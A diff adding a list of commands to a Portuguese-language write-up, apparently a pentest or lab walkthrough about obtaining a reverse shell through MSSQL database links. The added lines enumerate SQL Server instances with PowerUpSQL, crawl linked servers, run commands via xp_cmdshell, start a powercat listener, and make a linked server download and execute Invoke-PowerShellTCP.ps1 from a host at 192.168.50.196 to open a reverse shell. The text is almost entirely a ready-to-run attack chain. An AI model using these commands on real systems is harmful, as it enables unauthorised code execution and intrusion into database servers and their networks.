@@ -114,3 +114,9 @@ Pronto! Conseguimos um reverse shell através de um database link dentro do MSSQ
 
 ## Comandos Utilizados
 
+`Get-SQLInstanceDomain`
+`Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10`
+`Get-SQLServerLinkCrawl -Instance Instancia_acessível`
+`Get-SQLServerLinkCrawl -Instance Instancia_acessível -Query "exec master..xp_cmdshell 'whoami'" | ft`
+`powercat -l -v -p 443 -t 1000`
+`Get-SQLServerLinkCrawl -Instance Instancia_acessível -Query "exec master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://192.168.50.196/Invoke-PowerShellTCP.ps1'')'" | ft`
